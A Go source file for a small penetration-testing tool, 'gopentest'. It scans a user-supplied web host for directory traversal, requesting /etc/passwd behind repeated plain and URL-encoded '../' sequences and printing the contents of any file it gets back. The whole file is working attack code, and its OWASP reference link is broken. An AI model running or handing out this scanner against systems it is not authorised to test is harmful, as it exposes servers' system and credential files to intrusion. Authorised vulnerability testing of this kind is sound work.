// gopentest command checks common web server vulnerabilities.
package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	t := flag.String("t", "/etc/passwd", "The file to search for directory traversal")
	flag.Parse()

	if flag.NArg() != 1 {
		fmt.Printf("usage: %s host\n", filepath.Base(os.Args[0]))
		return
	}

	host := flag.Arg(0)

	traversal(host, *t)
}

// traversal searches directory traversal vulnerabilities
func traversal(host, file string) {
	if !strings.HasPrefix(host, "http://") &&
		!strings.HasPrefix(host, "https://") {
		host = "http://" + host
	}

	// Many encoded secuences are sugested in https://www.owasp.og/index.php/Path_gopentest
	// but most servers decode the url before the user code sees it.
	// Include one encoded secuence for unix and windows just in case.
	tokens := []string{"../", "%2e%2e%2f", "%2e%2e%5c"}

	count := 0
	for _, t := range tokens {
		padding := ""
		for i := 0; i < 15; i++ {
			url := join(host, padding, file)
			ok, err := getFile(url)
			if err != nil {
				fmt.Println(err)
			}
			if ok {
				count++
				break
			}
			padding += t
		}
	}

	fmt.Printf("%d OK responses\n", count)
}

func getFile(url string) (bool, error) {
	r, err := http.Get(url)
	if err != nil {
		return false, err
	}

	if r.StatusCode == 200 {
		fmt.Println(url)
		defer r.Body.Close()
		b, err := ioutil.ReadAll(r.Body)
		if err != nil {
			return false, err
		}
		if l := len(b); l > 0 {
			if l > 300 {
				b = b[:300]
			}
			fmt.Printf("%s\n\n", b)
			return true, nil
		}
	}

	return false, nil
}

// custom because filepath.Join alters the :// part by calling Clean.
func join(elems ...string) string {
	var result string
	for i, v := range elems {
		if len(v) == 0 {
			continue
		}
		if i == 0 {
			result = strings.TrimRight(v, "/")
			continue
		}
		result += "/" + strings.Trim(v, "/")
	}
	return result
}
